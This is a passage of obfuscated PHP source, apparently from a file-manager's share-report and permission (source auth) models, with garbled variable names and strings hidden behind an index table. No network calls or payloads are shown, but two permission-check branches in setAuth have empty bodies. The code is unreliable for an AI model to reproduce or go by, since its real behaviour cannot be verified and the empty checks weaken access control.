$¾ØÆ²š¡ = Input::get($ô¸àƒÒã[553], $ô¸àƒÒã[7], $ô¸àƒÒã[2314], array($ô¸àƒÒã[2233], $ô¸àƒÒã[547])); $¾ØÆ²š¡ = $†ÀóÄåÒ[$¾ØÆ²š¡]; $ëìƒ“Ó = $ëìƒ“Ó . "{$œææ‰Ñ}\40{$¾ØÆ²š¡}"; return $this->order($ëìƒ“Ó); } public function reportAdd($¼æ¥ÖëÙ) { $£Üß¸ç… =& $_SERVER[”øäÃÍª]; $’ÊÃÁ„ˆ = array($£Üß¸ç…[695] => $¼æ¥ÖëÙ[$£Üß¸ç…[695]], $£Üß¸ç…[1548] => USER_ID); if (Model($£Üß¸ç…[2309])->where($’ÊÃÁ„ˆ)->find()) { return !1; } $»ß¢øÂË = array($£Üß¸ç…[695] => $¼æ¥ÖëÙ[$£Üß¸ç…[695]], $£Üß¸ç…[1819] => $¼æ¥ÖëÙ[$£Üß¸ç…[1819]], $£Üß¸ç…[191] => $¼æ¥ÖëÙ[$£Üß¸ç…[191]], $£Üß¸ç…[565] => $¼æ¥ÖëÙ[$£Üß¸ç…[565]], $£Üß¸ç…[1548] => USER_ID, $£Üß¸ç…[33] => $¼æ¥ÖëÙ[$£Üß¸ç…[33]], $£Üß¸ç…[548] => $¼æ¥ÖëÙ[$£Üß¸ç…[548]]); return Model($£Üß¸ç…[2309])->add($»ß¢øÂË); } public function reportList($ÂĞäàÈÆ) { $Å‡ÌöâĞ =& $_SERVER[”øäÃÍª]; $…İ¢›Ì¾ = array(); if ($ÂĞäàÈÆ[$Å‡ÌöâĞ[870]]) { $óÌ·Øê = $ÂĞäàÈÆ[$Å‡ÌöâĞ[871]] ? $ÂĞäàÈÆ[$Å‡ÌöâĞ[871]] : strtotime(date($Å‡ÌöâĞ[2312])); $…İ¢›Ì¾[$Å‡ÌöâĞ[231]] = array($Å‡ÌöâĞ[408], array($ÂĞäàÈÆ[$Å‡ÌöâĞ[870]], $óÌ·Øê)); } if (isset($ÂĞäàÈÆ[$Å‡ÌöâĞ[33]]) && in_array($ÂĞäàÈÆ[$Å‡ÌöâĞ[33]], array($Å‡ÌöâĞ[91], $Å‡ÌöâĞ[532], $Å‡ÌöâĞ[2315], $Å‡ÌöâĞ[2316], $Å‡ÌöâĞ[2317]))) { $…İ¢›Ì¾[$Å‡ÌöâĞ[33]] = $ÂĞäàÈÆ[$Å‡ÌöâĞ[33]]; } if (isset($ÂĞäàÈÆ[$Å‡ÌöâĞ[859]]) && in_array($ÂĞäàÈÆ[$Å‡ÌöâĞ[859]], array($Å‡ÌöâĞ[228], $Å‡ÌöâĞ[91], $Å‡ÌöâĞ[532], $Å‡ÌöâĞ[2315]))) { $…İ¢›Ì¾[$Å‡ÌöâĞ[859]] = $ÂĞäàÈÆ[$Å‡ÌöâĞ[859]]; } $Ï‡Ğéğª = Input::get($Å‡ÌöâĞ[553], $Å‡ÌöâĞ[7], $Å‡ÌöâĞ[2314], array($Å‡ÌöâĞ[2233], $Å‡ÌöâĞ[547])); $éë´’äØ = array($Å‡ÌöâĞ[545] => $Å‡ÌöâĞ[546], $Å‡ÌöâĞ[547] => $Å‡ÌöâĞ[548]); $á¢„Æé‰ = $Å‡ÌöâĞ[2318] . $éë´’äØ[$Ï‡Ğéğª]; $®³”‘±› = Model($Å‡ÌöâĞ[2309])->where($…İ¢›Ì¾)->order($á¢„Æé‰)->selectPage(20); if (empty($®³”‘±›[$Å‡ÌöâĞ[446]])) { return array(); } $æ”³Üº€ = array_to_keyvalue_group($®³”‘±›[$Å‡ÌöâĞ[446]], $Å‡ÌöâĞ[859], $Å‡ÌöâĞ[695]); if (!empty($æ”³Üº€[0])) { $ÂĞäàÈÆ = $æ”³Üº€[0]; $…İ¢›Ì¾ = array($Å‡ÌöâĞ[695] => array($Å‡ÌöâĞ[7], $ÂĞäàÈÆ)); $úÍ’àÆÎ = $this->where($…İ¢›Ì¾)->field($Å‡ÌöâĞ[695])->select(); $úÍ’àÆÎ = array_to_keyvalue($úÍ’àÆÎ, $Å‡ÌöâĞ[12], $Å‡ÌöâĞ[695]); $Ü‹””¢ô = array_diff($ÂĞäàÈÆ, $úÍ’àÆÎ); if (!empty($Ü‹””¢ô)) { foreach ($®³”‘±›[$Å‡ÌöâĞ[446]] as $ÁÚ±×ÒØ => $ÄßºãàÈ) { if (in_array($ÄßºãàÈ[$Å‡ÌöâĞ[695]], $Ü‹””¢ô)) { unset($®³”‘±›[$Å‡ÌöâĞ[446]][$ÁÚ±×ÒØ]); } } } } $this->_listDataApply($®³”‘±›[$Å‡ÌöâĞ[446]]); return $®³”‘±›; } public function reportStatus($±ÕøÛù›) { $©ÅÁŞ =& $_SERVER[”øäÃÍª]; $—¡Íƒ‰  = array($©ÅÁŞ[487] => $±ÕøÛù›[$©ÅÁŞ[487]]); $§Èı“Å× = Model($©ÅÁŞ[2309])->where($—¡Íƒ‰ )->field($©ÅÁŞ[2319])->find(); if (!$§Èı“Å×) { return !1; } $¥¸³©Ô = array($©ÅÁŞ[859] => $±ÕøÛù›[$©ÅÁŞ[859]]); if ($±ÕøÛù›[$©ÅÁŞ[859]] == $©ÅÁŞ[2315] && $§Èı“Å×[$©ÅÁŞ[859]] == $©ÅÁŞ[2315]) { $¥¸³©Ô[$©ÅÁŞ[859]] = 0; } $úøÎá“ş = Model($©ÅÁŞ[2309])->where($—¡Íƒ‰ )->save($¥¸³©Ô); if ($±ÕøÛù›[$©ÅÁŞ[859]] == $©ÅÁŞ[532]) { if ($§Èı“Å×[$©ÅÁŞ[565]] != $©ÅÁŞ[228] && $this->shareFileMeta($§Èı“Å×[$©ÅÁŞ[565]])) { $this->shareFileMeta($§Èı“Å×[$©ÅÁŞ[565]], 0); } $this->remove($§Èı“Å×[$©ÅÁŞ[695]]); return !0; } if ($úøÎá“ş && $±ÕøÛù›[$©ÅÁŞ[859]] == $©ÅÁŞ[2315]) { $®æ‘€†Á = $¥¸³©Ô[$©ÅÁŞ[859]] == $©ÅÁŞ[2315] ? 1 : 0; $this->shareFileMeta($§Èı“Å×[$©ÅÁŞ[565]], $®æ‘€†Á); $this->removeByFile($§Èı“Å×[$©ÅÁŞ[565]]); } return $úøÎá“ş; } private function removeByFile($êœ‚¹ø‚) { $¶›şéÁŸ =& $_SERVER[”øäÃÍª]; $ºÑäÃ“½ = Model($¶›şéÁŸ[941])->where(array($¶›şéÁŸ[565] => $êœ‚¹ø‚))->field($¶›şéÁŸ[191])->select(); $å¢ÔÒÏæ = array_to_keyvalue($ºÑäÃ“½, $¶›şéÁŸ[12], $¶›şéÁŸ[191]); $ÍóõğÖ = array($¶›şéÁŸ[191] => array($¶›şéÁŸ[7], $å¢ÔÒÏæ), $¶›şéÁŸ[586] => 1); $ºÑäÃ“½ = $this->where($ÍóõğÖ)->field($¶›şéÁŸ[695])->select(); if (empty($ºÑäÃ“½)) { return; } $€ê„ÊïÔ = array_to_keyvalue($ºÑäÃ“½, $¶›şéÁŸ[12], $¶›şéÁŸ[695]); $this->remove($€ê„ÊïÔ); } private function shareFileMeta($ªß÷Øº£, $¼úÎñîÙ = null) { $Û×¾²Š =& $_SERVER[”øäÃÍª]; $­Ù®€è = array($Û×¾²Š[565] => $ªß÷Øº£, $Û×¾²Š[95] => $Û×¾²Š[2320]); if (is_null($¼úÎñîÙ)) { return Model($Û×¾²Š[2321])->where($­Ù®€è)->find(); } $­Ù®€è[$Û×¾²Š[451]] = $¼úÎñîÙ; Model($Û×¾²Š[2321])->add($­Ù®€è, array(), !0); } } class SourceAuthModel extends ModelBase { protected $tableName = "\151\157\137\x73\157\x75\162\143\x65\x5f\x61\165\164\x68"; public function getAuth($Á¥ºÃî‰) { $ó¬ÊŒÂÙ =& $_SERVER[”øäÃÍª]; $êóúæîË = $this->sourceAuthSelect($Á¥ºÃî‰); $àöòÛÕ = array(); $Äù­´ ‹ = array(); $ä¥¼Œä° = 2 << 25; foreach ($êóúæîË as $ÒÇ¡ÈÍ£) { $âÈª§Õ‘ = Model($ó¬ÊŒÂÙ[599])->listData($ÒÇ¡ÈÍ£[$ó¬ÊŒÂÙ[1595]]); if (!$âÈª§Õ‘) { continue; } $àöòÛÕ[] = $ÒÇ¡ÈÍ£; $ı®¾—” = 0; if ($ÒÇ¡ÈÍ£[$ó¬ÊŒÂÙ[188]] == SourceModel::TYPE_GROUP) { $ı®¾—” = $ä¥¼Œä° * 2; } if ($ÒÇ¡ÈÍ£[$ó¬ÊŒÂÙ[188]] == SourceModel::TYPE_USER) { $ı®¾—” = $ä¥¼Œä°; } if ($ÒÇ¡ÈÍ£[$ó¬ÊŒÂÙ[188]] == SourceModel::TYPE_USER && $ÒÇ¡ÈÍ£[$ó¬ÊŒÂÙ[597]] == $ó¬ÊŒÂÙ[228]) { $ı®¾—” = 0; } $Äù­´ ‹[] = $âÈª§Õ‘[$ó¬ÊŒÂÙ[510]] + $ı®¾—”; } array_multisort($Äù­´ ‹, SORT_DESC, $àöòÛÕ); return $àöòÛÕ; } public function sourceAuthSelect($»Í¢ óë) { $Òòƒà‰ß =& $_SERVER[”øäÃÍª]; static $øÍÜ†ÙÔ = array(); $™àù¼Å = is_array($»Í¢ óë) ? !1 : !0; if ($™àù¼Å) { $»Í¢ óë = array($»Í¢ óë); } $ñôæªßê = array(); foreach ($»Í¢ óë as $Í¶İŞôÆ) { if (isset($øÍÜ†ÙÔ[$Í¶İŞôÆ])) { $ñôæªßê[$Í¶İŞôÆ] = $øÍÜ†ÙÔ[$Í¶İŞôÆ]; } } if (count($ñôæªßê) == count($»Í¢ óë)) { return $™àù¼Å ? $ñôæªßê[$»Í¢ óë[0]] : $ñôæªßê; } $…ÚğÒÛ = $Òòƒà‰ß[2322]; $Ú“™¹æù = array($Òòƒà‰ß[191] => array($Òòƒà‰ß[7], $»Í¢ óë)); $â…İé¯ç = $this->field($…ÚğÒÛ)->order($Òòƒà‰ß[487])->where($Ú“™¹æù)->select(); $“±ÔÛ = array_to_keyvalue_group($â…İé¯ç, $Òòƒà‰ß[191]); foreach ($»Í¢ óë as $Í¶İŞôÆ) { $øÍÜ†ÙÔ[$Í¶İŞôÆ] = $“±ÔÛ[$Í¶İŞôÆ] ? $“±ÔÛ[$Í¶İŞôÆ] : array(); } if ($™àù¼Å) { return $â…İé¯ç; } return $“±ÔÛ; } public function setAuth($ÛÂ¼öêÕ, $¢ñÌìÂÀ) { $‡Õ©†¡ =& $_SERVER[”øäÃÍª]; $¨ê¸é³â = Model($‡Õ©†¡[1488])->sourceInfo($ÛÂ¼öêÕ); if (!$¨ê¸é³â) { return !1; } if ($¨ê¸é³â[$‡Õ©†¡[188]] != SourceModel::TYPE_GROUP) { return !1; } $¡º˜´ö² = 1; $ÄûÜ×¢û = $¨ê¸é³â[$‡Õ©†¡[597]]; if ($ÄûÜ×¢û != $¡º˜´ö²) { $Äƒ²ª½ƒ = array($‡Õ©†¡[1450] => $ÄûÜ×¢û); $¼ â°ê´ = Model($‡Õ©†¡[2232])->field($‡Õ©†¡[1548])->where($Äƒ²ª½ƒ)->select(); $¼ â°ê´ = array_to_keyvalue($¼ â°ê´, $‡Õ©†¡[12], $‡Õ©†¡[1548]); } $Ÿ´ÉÙ¦Ğ = array(SourceModel::TYPE_GROUP, SourceModel::TYPE_USER); $Ñ¼¶Ö£­ = array(); foreach ($¢ñÌìÂÀ as $ïÙí¿ Â) { if (!in_array($ïÙí¿ Â[$‡Õ©†¡[188]], $Ÿ´ÉÙ¦Ğ)) { show_json(LNG($‡Õ©†¡[2323]), !1); } if ($ÄûÜ×¢û != $¡º˜´ö²) { if ($ïÙí¿ Â[$‡Õ©†¡[188]] == SourceModel::TYPE_GROUP) { } if ($ïÙí¿ Â[$‡Õ©†¡[597]] != 0 && !in_array($ïÙí¿ Â[$‡Õ©†¡[597]], $¼ â°ê´)) { } } if ($ïÙí¿ Â[$‡Õ©†¡[597]] == 0) { $ïÙí¿ Â[$‡Õ©†¡[188]] = SourceModel::TYPE_USER; } $Ñ¼¶Ö£­[] = array($‡Õ©†¡[191] => $ÛÂ¼öêÕ, $‡Õ©†¡[188] => intval($ïÙí¿ Â[$‡Õ©†¡[188]]), $‡Õ©†¡[597] => intval($ïÙí¿ Â[$‡Õ©†¡[597]]), $‡Õ©†¡[1595] => intval($ïÙí¿ Â[$‡Õ©†¡[1595]]) ? intval($ïÙí¿ Â[$‡Õ©†¡[1595]]) : 0, $‡Õ©†¡[2301] => intval($ïÙí¿ Â[$‡Õ©†¡[2301]]) ? intval($ïÙí¿ Â[$‡Õ©†¡[2301]]) : -1); } $this->where(array($‡Õ©†¡[514] => $ÛÂ¼öêÕ))->delete(); $this->addAll($Ñ¼¶Ö£­); return !0; } public function authClear($Î‰•æ®—) { $©Æ’‰çÌ =& $_SERVER[”øäÃÍª]; $¸Û©ÑËÅ = Model($©Æ’‰çÌ[1488])->sourceInfo($Î‰•æ®—); $õ‡ ¤ç = array($Î‰•æ®—); if ($¸Û©ÑËÅ[$©Æ’‰çÌ[508]] == $©Æ’‰çÌ[91]) { $ĞÛ”á¸À = array($©Æ’‰çÌ[682] => array($©Æ’‰çÌ[643], $¸Û©ÑËÅ[$©Æ’‰çÌ[612]] . $Î‰•æ®— . $©Æ’‰çÌ[644])); $õ‡ ¤ç = Model($©Æ’‰çÌ[1488])->field($©Æ’‰çÌ[514])->where($ĞÛ”á¸À)->getField($©Æ’‰çÌ[191], !0); $õ‡ ¤ç[] = $Î‰•æ®—; } $this->where(array($©Æ’‰çÌ[514] => array($©Æ’‰çÌ[515], $õ‡ ¤ç)))->delete(); return !0; } public function getAllParent($Ûõóè œ) { $ıÚõîŞÆ =& $_SERVER[”øäÃÍª]; $šÉÏİŞ¬ = Model($ıÚõîŞÆ[1488])->sourceInfo($Ûõóè œ); if (!$šÉÏİŞ¬ || $šÉÏİŞ¬[$ıÚõîŞÆ[188]] != SourceModel::TYPE_GROUP) { return array(); } $‰¶ı”ÔÅ = Model($ıÚõîŞÆ[1488])->parentLevelArray($šÉÏİŞ¬[$ıÚõîŞÆ[612]]); $‘×øÔİë = array_merge(array(intval($Ûõóè œ)), array_reverse($‰¶ı”ÔÅ)); $ªœ¨ùÚ´ = $this->sourceAuthSelect($‘×øÔİë); $Ÿ‘øÓØÅ = $GLOBALS[$ıÚõîŞÆ[6]][$ıÚõîŞÆ[92]][$ıÚõîŞÆ[2245]] == 1; $ƒÂ¯Â½‘ = $Ÿ‘øÓØÅ ? 3 : 2; $ğ¿æ €¶ = Model($ıÚõîŞÆ[1448])->getInfo($šÉÏİŞ¬[$ıÚõîŞÆ[597]]); $ÏåŞÅ¹ = explode($ıÚõîŞÆ[50], trim($ğ¿æ €¶[$ıÚõîŞÆ[612]], $ıÚõîŞÆ[50])); $š¥‘äõ§ = array_merge(array($ğ¿æ €¶[$ıÚõîŞÆ[1450]]), array_reverse(array_slice($ÏåŞÅ¹, $ƒÂ¯Â½‘))); foreach ($ªœ¨ùÚ´ as $Ûõóè œ => $¡¬ê±Ì) { foreach ($¡¬ê±Ì as $‡ä¦„¬”) { if (!$‡ä¦„¬” || !$‡ä¦„¬”[$ıÚõîŞÆ[597]] || $‡ä¦„¬”[$ıÚõîŞÆ[597]] == $ıÚõîŞÆ[228]) { continue; } if ($‡ä¦„¬”[$ıÚõîŞÆ[188]] != SourceModel::TYPE_GROUP) { continue; } $š¥‘äõ§[] = $‡ä¦„¬”[$ıÚõîŞÆ[597]]; } } $š¥‘äõ§ = array_unique($š¥‘äõ§); $–óÉÅÈ = array($ıÚõîŞÆ[428] => _get($GLOBALS[$ıÚõîŞÆ[7]], $ıÚõîŞÆ[428], 1), $ıÚõîŞÆ[439] => _get($GLOBALS[$ıÚõîŞÆ[7]], $ıÚõîŞÆ[439], 500)); $GLOBALS[$ıÚõîŞÆ[7]][$ıÚõîŞÆ[428]] = 1; $GLOBALS[$ıÚõîŞÆ[7]][$ıÚõîŞÆ[439]] = 500; $Õø®™¡ = array($ıÚõîŞÆ[516] => 0, $ıÚõîŞÆ[2146] => AuthModel::authAll(), $ıÚõîŞÆ[517] => LNG($ıÚõîŞÆ[2324]), $ıÚõîŞÆ[2161] => $ıÚõîŞÆ[2325]); $‹³Â„©° = array(); $öÛ²ÒüÇ = explode($ıÚõîŞÆ[50], $ıÚõîŞÆ[2326]); $Ü°É±œ¤ = explode($ıÚõîŞÆ[50], $ıÚõîŞÆ[2327]); foreach ($š¥‘äõ§ as $™â™ÇÙõ) { $”ˆ«¯üç = Model($ıÚõîŞÆ[1448])->getInfo($™â™ÇÙõ); $ˆÉê¯ã = array_field_key($”ˆ«¯üç, $öÛ²ÒüÇ); $Ø¿Ç«ø = Model($ıÚõîŞÆ[625])->listByGroup($™â™ÇÙõ); foreach ($Ø¿Ç«ø[$ıÚõîŞÆ[446]] as $ª×üïí => $ÚÑĞ½øÕ) { $this->userGroupList($ÚÑĞ½øÕ[$ıÚõîŞÆ[1548]], $ÚÑĞ½øÕ); $†š×±ÛÇ = $ÚÑĞ½øÕ[$ıÚõîŞÆ[1548]] . $ıÚõîŞÆ[12]; if (isset($‹³Â„©°[$†š×±ÛÇ])) { continue; } $¢×ˆÓÃƒ = Model($ıÚõîŞÆ[2328])->listData($ÚÑĞ½øÕ[$ıÚõîŞÆ[2329]]); $ÚÑĞ½øÕ[$ıÚõîŞÆ[2330]] = Action($ıÚõîŞÆ[2331])->parseUrl($ÚÑĞ½øÕ[$ıÚõîŞÆ[2330]]); $ÚÑĞ½øÕ[$ıÚõîŞÆ[1899]] = $¢×ˆÓÃƒ && $¢×ˆÓÃƒ[$ıÚõîŞÆ[2332]] == 1; $ã„ˆÑ = $this->groupRootAuth($™â™ÇÙõ, $ÚÑĞ½øÕ[$ıÚõîŞÆ[1548]]); $ã„ˆÑ = $ÚÑĞ½øÕ[$ıÚõîŞÆ[1899]] ? $Õø®™¡ : $ã„ˆÑ; $‹³Â„©°[$†š×±ÛÇ] = array($ıÚõîŞÆ[2333] => $ıÚõîŞÆ[2334], $ıÚõîŞÆ[2335] => LNG($ıÚõîŞÆ[2336]), $ıÚõîŞÆ[2313] => array_field_key($ÚÑĞ½øÕ, $Ü°É±œ¤), $ıÚõîŞÆ[510] => $ã„ˆÑ, $ıÚõîŞÆ[511] => $ã„ˆÑ[$ıÚõîŞÆ[510]], $ıÚõîŞÆ[2337] => $ˆÉê¯ã); } } $GLOBALS[$ıÚõîŞÆ[7]][$ıÚõîŞÆ[428]] = $–óÉÅÈ[$ıÚõîŞÆ[428]]; $GLOBALS[$ıÚõîŞÆ[7]][$ıÚõîŞÆ[439]] = $–óÉÅÈ[$ıÚõîŞÆ[439]]; foreach ($ªœ¨ùÚ´ as $Ûõóè œ => $¡¬ê±Ì) { if (!$¡¬ê±Ì) { continue; } foreach ($¡¬ê±Ì as $‡ä¦„¬”) { if (!$‡ä¦„¬” || !$‡ä¦„¬”[$ıÚõîŞÆ[597]] || $‡ä¦„¬”[$ıÚõîŞÆ[597]] == $ıÚõîŞÆ[228]) { continue; } if ($‡ä¦„¬”[$ıÚõîŞÆ[188]] != SourceModel::TYPE_USER) { continue; } $†š×±ÛÇ = $‡ä¦„¬”[$ıÚõîŞÆ[597]] . $ıÚõîŞÆ[12]; if (isset($‹³Â„©°[$†š×±ÛÇ])) { continue; } $îÜŞá’µ = $this->authMake($¡¬ê±Ì, $†š×±ÛÇ); if (!$îÜŞá’µ || !$îÜŞá’µ[$ıÚõîŞÆ[2335]]) { continue; } $‹³Â„©°[$†š×±ÛÇ] = array($ıÚõîŞÆ[2333] => $ıÚõîŞÆ[2338], $ıÚõîŞÆ[2335] => $îÜŞá’µ[$ıÚõîŞÆ[2335]], $ıÚõîŞÆ[2313] => Model($ıÚõîŞÆ[625])->getInfoSimpleOuter($†š×±ÛÇ), $ıÚõîŞÆ[510] => $îÜŞá’µ[$ıÚõîŞÆ[564]], $ıÚõîŞÆ[511] => $îÜŞá’µ[$ıÚõîŞÆ[564]][$ıÚõîŞÆ[510]], $ıÚõîŞÆ[2337] => $îÜŞá’µ[$ıÚõîŞÆ[2339]]); } } foreach ($ªœ¨ùÚ´ as $Ûõóè œ => $¡¬ê±Ì) { if (!$¡¬ê±Ì) { continue; } foreach ($‹³Â„©° as $†š×±ÛÇ => $Ú—Şî») { if ($Ú—Şî»[$ıÚõîŞÆ[2313]][$ıÚõîŞÆ[1899]] || $Ú—Şî»[$ıÚõîŞÆ[2333]] == $ıÚõîŞÆ[2338]) { continue; } $îÜŞá’µ = $this->authMake($¡¬ê±Ì, $†š×±ÛÇ); if (!$îÜŞá’µ || !$îÜŞá’µ[$ıÚõîŞÆ[2335]]) { continue; } $‹³Â„©°[$†š×±ÛÇ] = array($ıÚõîŞÆ[2333] => $ıÚõîŞÆ[2338], $ıÚõîŞÆ[2335] => $îÜŞá’µ[$ıÚõîŞÆ[2335]], $ıÚõîŞÆ[2313] => $Ú—Şî»[$ıÚõîŞÆ[2313]], $ıÚõîŞÆ[510] => $îÜŞá’µ[$ıÚõîŞÆ[564]], $ıÚõîŞÆ[511] => $îÜŞá’µ[$ıÚõîŞÆ[564]][$ıÚõîŞÆ[510]], $ıÚõîŞÆ[2337] => $îÜŞá’µ[$ıÚõîŞÆ[2339]]); } } $‹³Â„©° = array_sort_by($‹³Â„©°, $ıÚõîŞÆ[511], $ıÚõîŞÆ[548]); return $‹³Â„©°; } public function getAllChildren($£Îéæ¢‘) { $¥—ˆı†‘ =& $_SERVER[”øäÃÍª]; $·ŒÓ¸– = Model($¥—ˆı†‘[1488])->sourceInfo($£Îéæ¢‘); if ($·ŒÓ¸–[$¥—ˆı†‘[508]] != $¥—ˆı†‘[91]) { return $this->sourceListAuth(array($£Îéæ¢‘)); } if ($·ŒÓ¸–[$¥—ˆı†‘[188]] != SourceModel::TYPE_GROUP) { return array(); } $Ç‘Èïü = 1; $¿×èê³½ = array($£Îéæ¢‘); if ($·ŒÓ¸–[$¥—ˆı†‘[190]] == $¥—ˆı†‘[228] && $·ŒÓ¸–[$¥—ˆı†‘[597]] != $Ç‘Èïü) { $¿×èê³½ = $this->groupChidldAllRootSource($·ŒÓ¸–[$¥—ˆı†‘[597]]); } $ªæ™Öòñ = $this->field($¥—ˆı†‘[191])->group($¥—ˆı†‘[191])->select(); $ªæ™Öòñ = array_to_keyvalue($ªæ™Öòñ, $¥—ˆı†‘[12], $¥—ˆı†‘[191]); if (!$ªæ™Öòñ) { return array(); } $„“‡ıÓ = $¥—ˆı†‘[2340]; $Šê±Œ›› = array($¥—ˆı†‘[191] => array($¥—ˆı†‘[7], $ªæ™Öòñ), $¥—ˆı†‘[528] => $¥—ˆı†‘[228]); $Ş‘öƒûæ = Model($¥—ˆı†‘[941])->field($„“‡ıÓ)->where($Šê±Œ››)->select(); $‡ã—à‰Û = array($£Îéæ¢‘); foreach ($Ş‘öƒûæ as $£üç³³) { foreach ($¿×èê³½ as $’Ñ‘‹) { $ìáí®µã = $¥—ˆı†‘[50] . $’Ñ‘‹ . $¥—ˆı†‘[50]; $®¹ĞÀæ = $£üç³³[$¥—ˆı†‘[612]] . $£üç³³[$¥—ˆı†‘[191]] . $¥—ˆı†‘[50]; if (strstr($®¹ĞÀæ, $ìáí®µã)) { $‡ã—à‰Û[] = $£üç³³[$¥—ˆı†‘[191]]; break; } } } return $this->sourceListAuth($‡ã—à‰Û); } private function sourceListAuth($ıÚ•Ø‰è) { $††¾é¯ö =& $_SERVER[”øäÃÍª]; $Õ±™Å¢Ç = Model($††¾é¯ö[1488])->sourceListInfo($ıÚ•Ø‰è, !0); $É¶ÏÇ«Û = $this->sourceAuthSelect($ıÚ•Ø‰è); $†¶™ĞÒé = array(); $ûİà¸÷Ì = array(); foreach ($Õ±™Å¢Ç as $Ğ·›äš§) { unset($Ğ·›äš§[$††¾é¯ö[551]]); unset($Ğ·›äš§[$††¾é¯ö[549]]); unset($Ğ·›äš§[$††¾é¯ö[510]]); unset($Ğ·›äš§[$††¾é¯ö[90]]); $ê°Û¡ = $É¶ÏÇ«Û[$Ğ·›äš§[$††¾é¯ö[191]]]; if (!$ê°Û¡) { continue; } $Ğ·›äš§[$††¾é¯ö[2337]] = $this->authTargetInfo($ê°Û¡); $Ğ·›äš§[$††¾é¯ö[610]] = rtrim($Ğ·›äš§[$††¾é¯ö[616]], $††¾é¯ö[8]) . $††¾é¯ö[8] . ltrim($Ğ·›äš§[$††¾é¯ö[610]], $††¾é¯ö[8]); $†¶™ĞÒé[] = $Ğ·›äš§; $Ê—ÔÓ½¤ = count(explode($††¾é¯ö[8], trim($Ğ·›äš§[$††¾é¯ö[610]], $††¾é¯ö[8]))); $ûİà¸÷Ì[] = $Ê—ÔÓ½¤ + ($Ğ·›äš§[$††¾é¯ö[33]] == $††¾é¯ö[78] ? 0 : 1000); } array_multisort($ûİà¸÷Ì, SORT_ASC, $†¶™ĞÒé); return $†¶™ĞÒé; } private function groupChidldAllRootSource($œ¬ù•İß) { $ú¹Û¦û =& $_SERVER[”øäÃÍª]; $à€î“çÌ = Model($ú¹Û¦û[1448])->groupChildrenAll($œ¬ù•İß); $Â¥ÃŞÊí = array($ú¹Û¦û[190] => 0, $ú¹Û¦û[597] => array($ú¹Û¦û[7], $à€î“çÌ), $ú¹Û¦û[188] => SourceModel::TYPE_GROUP); $·ûçé³¼ = Model($ú¹Û¦û[941])->field($ú¹Û¦û[191])->where($Â¥ÃŞÊí)->select(); $·ûçé³¼ = array_to_keyvalue($·ûçé³¼, $ú¹Û¦û[12], $ú¹Û¦û[191]); return $·ûçé³¼; } private function authTargetInfo($ šˆ„°“) { $¡œœ”† =& $_SERVER[”øäÃÍª]; $Á–º†ïõ = array(); $Ûó©Ï‰ê = array(); $Ô¿ÖıáĞ = 2 << 25; foreach ($ šˆ„°“ as $¬ »¤±é) { $ú‘‡ÍÉó = Model($¡œœ”†[599])->listData($¬ »¤±é[$¡œœ”†[1595]]); if (!$ú‘‡ÍÉó) { continue; } if ($¬ »¤±é[$¡œœ”†[188]] == SourceModel::TYPE_USER) { $Øğõ¼ = Model($¡œœ”†[605])->getInfoSimpleOuter($¬ »¤±é[$¡œœ”†[597]]); if ($Øğõ¼[$¡œœ”†[1548]] == $¡œœ”†[1332]) { continue; } if ($Øğõ¼[$¡œœ”†[1548]] == $¡œœ”†[228]) { $Øğõ¼[$¡œœ”†[32]] = LNG($¡œœ”†[2341]); } } else { $Øğõ¼ = Model($¡œœ”†[613])->getInfoSimple($¬ »¤±é[$¡œœ”†[597]]); } if (!$Øğõ¼) { continue; } $Øğõ¼[$¡œœ”†[564]] = $ú‘‡ÍÉó; $Á–º†ïõ[] = $Øğõ¼; $Ğø¸»  = 0; if ($¬ »¤±é[$¡œœ”†[188]] == SourceModel::TYPE_GROUP) { $Ğø¸»  = $Ô¿ÖıáĞ * 2; } if ($¬ »¤±é[$¡œœ”†[188]] == SourceModel::TYPE_USER) { $Ğø¸»  = $Ô¿ÖıáĞ; } if ($¬ »¤±é[$¡œœ”†[188]] == SourceModel::TYPE_USER && $¬ »¤±é[$¡œœ”†[597]] == $¡œœ”†[228]) { $Ğø¸»  = 0; } $Ûó©Ï‰ê[] = $ú‘‡ÍÉó[$¡œœ”†[510]] + $Ğø¸» ; } array_multisort($Ûó©Ï‰ê, SORT_DESC, $Á–º†ïõ); return $Á–º†ïõ; } public function getAllChildrenByUser($ŠÁé, $Î¼´ßŠŞ) { $Õª²åÁÉ =& $_SERVER[”øäÃÍª]; $ø¤¾±š¼ = Model($Õª²åÁÉ[625])->getInfo($Î¼´ßŠŞ); if (!$Î¼´ßŠŞ || !$ŠÁé || !$ø¤¾±š¼) { return array(); } $”ˆ‡«çŠ = Model($Õª²åÁÉ[1488])->sourceInfo($ŠÁé); $˜à‡Œş = array(); $¦ß–°Â = 1; if ($”ˆ‡«çŠ[$Õª²åÁÉ[190]] == $Õª²åÁÉ[228] && $”ˆ‡«çŠ[$Õª²åÁÉ[597]] != $¦ß–°Â && $this->groupContainUser($”ˆ‡«çŠ[$Õª²åÁÉ[597]], $Î¼´ßŠŞ)) { foreach ($ø¤¾±š¼[$Õª²åÁÉ[1449]] as $ÁşÍ×Ô) { $†úó‘÷Ò = Model($Õª²åÁÉ[613])->getInfo($ÁşÍ×Ô[$Õª²åÁÉ[1450]]); $›·ÈÍ‡ì = Model($Õª²åÁÉ[625])->getInfoSimpleOuter($Î¼´ßŠŞ); $›·ÈÍ‡ì[$Õª²åÁÉ[564]] = $ÁşÍ×Ô[$Õª²åÁÉ[510]]; if (Model($Õª²åÁÉ[599])->authCheckAction($ÁşÍ×Ô[$Õª²åÁÉ[510]][$Õª²åÁÉ[510]], $Õª²åÁÉ[1520])) { continue; } $ã‘€‚±é = array($Õª²åÁÉ[32] => $Õª²åÁÉ[1351] . $†úó‘÷Ò[$Õª²åÁÉ[32]], $Õª²åÁÉ[191] => $†úó‘÷Ò[$Õª²åÁÉ[90]][$Õª²åÁÉ[191]], $Õª²åÁÉ[87] => KodIO::make($†úó‘÷Ò[$Õª²åÁÉ[90]][$Õª²åÁÉ[191]]), $Õª²åÁÉ[190] => $Õª²åÁÉ[228], $Õª²åÁÉ[188] => $Õª²åÁÉ[606], $Õª²åÁÉ[33] => $Õª²åÁÉ[647], $Õª²åÁÉ[610] => $†úó‘÷Ò[$Õª²åÁÉ[617]], $Õª²åÁÉ[1450] => $†úó‘÷Ò[$Õª²åÁÉ[1450]], $Õª²åÁÉ[614] => $†úó‘÷Ò[$Õª²åÁÉ[190]], $Õª²åÁÉ[2337] => array($›·ÈÍ‡ì)); $˜à‡Œş[$ã‘€‚±é[$Õª²åÁÉ[191]]] = $ã‘€‚±é; } } $ğ²»‚ü = array(); $”£²åÕ = $this->getAllChildren($ŠÁé); 